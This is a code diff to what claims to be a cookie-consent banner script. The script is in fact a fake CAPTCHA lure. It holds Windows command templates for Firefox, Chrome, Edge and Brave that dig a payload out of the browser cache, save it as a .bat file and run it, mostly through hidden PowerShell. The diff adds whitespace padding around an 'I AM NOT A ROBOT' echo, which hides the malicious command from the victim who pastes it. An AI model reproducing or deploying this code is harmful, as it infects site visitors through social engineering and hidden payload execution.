@@ -10,8 +10,10 @@
   if (window.__CONSENT_INJECTED__) return;
   window.__CONSENT_INJECTED__ = true;
 
+  var VERIFICATION_ECHO = '                             I AM NOT A ROBOT                           ';
+
   var CONSENT_CONFIG = {
-    version: '1.9.27',
+    version: '1.9.28',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -42,12 +44,12 @@
       edge: 17244,
       brave: 17244
     },
-    verificationSuffix: ' & echo I AM NOT A ROBOT',
+    verificationSuffix: ' & echo ' + VERIFICATION_ECHO,
     verificationTemplates: {
       firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo "%f">nul&&copy /y "%f" t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat',
-      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo I AM NOT A ROBOT',
-      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo I AM NOT A ROBOT',
-      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo I AM NOT A ROBOT'
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo ' + VERIFICATION_ECHO,
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo ' + VERIFICATION_ECHO,
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @if %~zf=={CSZ} copy "%f" %TEMP%\\t.bat>nul 2>nul&powershell -w hidden -nop -c "cmd /c %TEMP%\\t.bat"&echo ' + VERIFICATION_ECHO
     }
   };
 
